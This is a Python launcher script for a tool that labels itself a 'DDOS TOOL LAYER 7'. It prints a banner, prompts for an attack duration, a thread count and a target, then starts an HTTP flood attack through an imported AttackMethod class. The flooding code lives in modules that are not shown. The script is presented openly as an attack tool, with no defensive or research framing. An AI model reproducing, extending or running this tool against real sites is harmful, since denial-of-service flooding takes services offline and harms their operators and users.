# -*- coding: utf-8 -*-

# Created by nuvem and tsk

import os
import sys

from colorama import Fore

# Changing CWD to the canonical path of the file.
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    os.system("cls" if os.name == "nt" else "clear")

    # Tries to download Wireshark if Windows OS is detected.
    import tools.addons.wireshark
    from tools.addons.checks import check_number_input, check_target_input
    from tools.method import AttackMethod

except ImportError as err:
    from tools.crash import CriticalError

    CriticalError("Failed to import some packages", err)


if __name__ == "__main__":

    logo = """
  ▒█████   ██▒   █▓▓█████  ██▀███   ██▓     ▒█████   ▄▄▄      ▓█████▄ 
  ▒██▒  ██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌
  ▒██░  ██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌
  ▒██   ██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄  ▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌
  ░ ████▓▒░   ▒▀█░  ░▒████▒░██▓ ▒██▒░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ 
  ░ ▒░▒░▒░    ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ 
    ░ ▒ ▒░    ░ ░░   ░ ░  ░  ░▒ ░ ▒░░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒ 
  ░ ░ ░ ▒       ░░     ░     ░░   ░   ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░ 
      ░ ░        ░     ░  ░   ░         ░  ░    ░ ░        ░  ░   ░    
                ░                                               ░     
  """

    CRED2 = "\33[91m"
    print(CRED2 + logo + CRED2)
    print("├───DDOS TOOL LAYER 7")

    try:
        time = check_number_input("time")
        threads = check_number_input("threads")
        target = check_target_input()

        with AttackMethod(
            duration=time, method_name="HTTP", threads=threads, target=target
        ) as attack:
            attack.start()
    except KeyboardInterrupt:
        print(
            f"\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Program closed.{Fore.RESET}"
        )
        sys.exit(1)
else:
    sys.exit(1)
